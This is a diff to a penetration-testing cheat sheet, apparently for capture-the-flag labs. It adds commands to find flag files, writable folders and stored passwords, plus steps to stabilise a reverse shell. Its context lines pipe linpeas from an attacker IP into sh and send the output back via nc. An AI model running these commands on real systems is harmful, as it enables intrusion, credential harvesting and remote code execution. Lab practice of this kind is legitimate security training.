@@ -1,4 +1,31 @@
-# Red Team Cheat Sheet
+Useful Quick Commands - Linux
+
+```bash
+# Find folders where the user has write permission
+find /home -type d -writable -user $(whoami)
+# Find flags
+find / -name "flag.txt" -print -quit 2>/dev/null
+find / -type f \( -name "local.txt" -o -name "proof.txt" -o -name "user.txt" -o -name "root.txt" -o -name "flag.txt" \) -print -quit 2>/dev/null
+# Linux - Find files containing keyword
+find '/var/www' -type f -exec grep -l 'password' {} + 2>/dev/null
+grep -rnw '/home/svc' -e 'password' 2>/dev/null
+```
+
+Useful Quick Commands - Windows
+
+```bash
+# Windows runas command
+runas /user:backupadmin cmd
+```
+
+Stabilize reverse shell
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+stty raw -echo; fg
+export TERM=xterm
+```
 
 # Web
 
@@ -102,5 +129,3 @@ https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 nc -lvnp 9002 | tee linpeas.out # attacker
 curl http://192.168.45.145/linpeas.sh | sh | nc 192.168.45.145 9002 # victim
 ```
-
-# Tunneling
